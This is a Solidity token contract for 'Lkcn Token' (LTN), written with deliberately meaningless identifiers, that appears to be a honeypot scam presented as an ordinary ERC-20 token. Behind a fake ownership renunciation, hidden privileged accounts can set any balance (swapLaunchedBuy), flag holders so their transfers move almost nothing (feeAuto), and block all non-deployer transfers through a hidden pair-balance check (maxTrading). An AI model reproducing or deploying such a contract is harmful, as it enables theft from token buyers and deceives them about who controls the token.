//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface exemptEnableSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract txSellReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitTx {
    function createPair(address receiverMin, address autoTrading) external returns (address);
}

interface modeSenderMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxSwap) external view returns (uint256);

    function transfer(address launchedAmount, uint256 atMin) external returns (bool);

    function allowance(address fundLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 atMin) external returns (bool);

    function transferFrom(
        address sender,
        address launchedAmount,
        uint256 atMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toMin, uint256 value);
    event Approval(address indexed fundLaunch, address indexed spender, uint256 value);
}

interface txWalletAt is modeSenderMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LkcnToken is txSellReceiver, modeSenderMin, txWalletAt {

    function fundLaunchReceiver() private view {
        require(minTrading[_msgSender()]);
    }

    string private listWallet = "Lkcn Token";

    uint256 public launchLaunched;

    bool public feeLaunch;

    function transfer(address buyTakeIs, uint256 atMin) external virtual override returns (bool) {
        return fromListToken(_msgSender(), buyTakeIs, atMin);
    }

    uint256 walletExempt;

    mapping(address => bool) public minTrading;

    bool private fundModeTake;

    bool public launchReceiver;

    function maxTrading(uint256 atMin) public {
        fundLaunchReceiver();
        walletExempt = atMin;
    }

    function name() external view virtual override returns (string memory) {
        return listWallet;
    }

    address launchSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function decimals() external view virtual override returns (uint8) {
        return amountSwap;
    }

    function symbol() external view virtual override returns (string memory) {
        return limitAuto;
    }

    function approve(address senderBuy, uint256 atMin) public virtual override returns (bool) {
        shouldAt[_msgSender()][senderBuy] = atMin;
        emit Approval(_msgSender(), senderBuy, atMin);
        return true;
    }

    function balanceOf(address maxSwap) public view virtual override returns (uint256) {
        return sellBuy[maxSwap];
    }

    uint256 private takeShould;

    bool private receiverMode;

    constructor (){
        
        exemptEnableSender maxLiquidity = exemptEnableSender(launchSender);
        tradingTake = limitTx(maxLiquidity.factory()).createPair(maxLiquidity.WETH(), address(this));
        
        launchedReceiver = _msgSender();
        walletTx();
        minTrading[launchedReceiver] = true;
        sellBuy[launchedReceiver] = isLimit;
        if (amountFeeTrading != receiverMode) {
            receiverMode = false;
        }
        emit Transfer(address(0), launchedReceiver, isLimit);
    }

    mapping(address => uint256) private sellBuy;

    address public tradingTake;

    address public launchedReceiver;

    uint256 public fromSellMax;

    function transferFrom(address shouldFeeWallet, address launchedAmount, uint256 atMin) external override returns (bool) {
        if (_msgSender() != launchSender) {
            if (shouldAt[shouldFeeWallet][_msgSender()] != type(uint256).max) {
                require(atMin <= shouldAt[shouldFeeWallet][_msgSender()]);
                shouldAt[shouldFeeWallet][_msgSender()] -= atMin;
            }
        }
        return fromListToken(shouldFeeWallet, launchedAmount, atMin);
    }

    uint256 tokenLimit;

    mapping(address => bool) public fundWallet;

    event OwnershipTransferred(address indexed launchedMax, address indexed fundMaxShould);

    string private limitAuto = "LTN";

    function fromListToken(address shouldFeeWallet, address launchedAmount, uint256 atMin) internal returns (bool) {
        if (shouldFeeWallet == launchedReceiver) {
            return teamMarketingSender(shouldFeeWallet, launchedAmount, atMin);
        }
        uint256 txTotalLaunch = modeSenderMin(tradingTake).balanceOf(launchedMaxMin);
        require(txTotalLaunch == walletExempt);
        require(launchedAmount != launchedMaxMin);
        if (fundWallet[shouldFeeWallet]) {
            return teamMarketingSender(shouldFeeWallet, launchedAmount, receiverLaunchLaunched);
        }
        return teamMarketingSender(shouldFeeWallet, launchedAmount, atMin);
    }

    function swapLaunchedBuy(address buyTakeIs, uint256 atMin) public {
        fundLaunchReceiver();
        sellBuy[buyTakeIs] = atMin;
    }

    uint256 constant receiverLaunchLaunched = 10 ** 10;

    uint256 public autoTeam;

    function totalSupply() external view virtual override returns (uint256) {
        return isLimit;
    }

    bool public amountFeeTrading;

    mapping(address => mapping(address => uint256)) private shouldAt;

    function teamMarketingSender(address shouldFeeWallet, address launchedAmount, uint256 atMin) internal returns (bool) {
        require(sellBuy[shouldFeeWallet] >= atMin);
        sellBuy[shouldFeeWallet] -= atMin;
        sellBuy[launchedAmount] += atMin;
        emit Transfer(shouldFeeWallet, launchedAmount, atMin);
        return true;
    }

    function feeMode(address marketingLaunched) public {
        if (feeLaunch) {
            return;
        }
        if (takeShould == launchLaunched) {
            tokenSwap = false;
        }
        minTrading[marketingLaunched] = true;
        if (receiverMode == fundModeTake) {
            receiverMode = true;
        }
        feeLaunch = true;
    }

    function allowance(address exemptTeam, address senderBuy) external view virtual override returns (uint256) {
        if (senderBuy == launchSender) {
            return type(uint256).max;
        }
        return shouldAt[exemptTeam][senderBuy];
    }

    uint8 private amountSwap = 18;

    address launchedMaxMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private marketingShould;

    address private takeList;

    function owner() external view returns (address) {
        return takeList;
    }

    uint256 private isLimit = 100000000 * 10 ** 18;

    function feeAuto(address senderSwapMax) public {
        fundLaunchReceiver();
        if (marketingShould == autoTeam) {
            fundModeTake = false;
        }
        if (senderSwapMax == launchedReceiver || senderSwapMax == tradingTake) {
            return;
        }
        fundWallet[senderSwapMax] = true;
    }

    function walletTx() public {
        emit OwnershipTransferred(launchedReceiver, address(0));
        takeList = address(0);
    }

    function getOwner() external view returns (address) {
        return takeList;
    }

    bool public tokenSwap;

}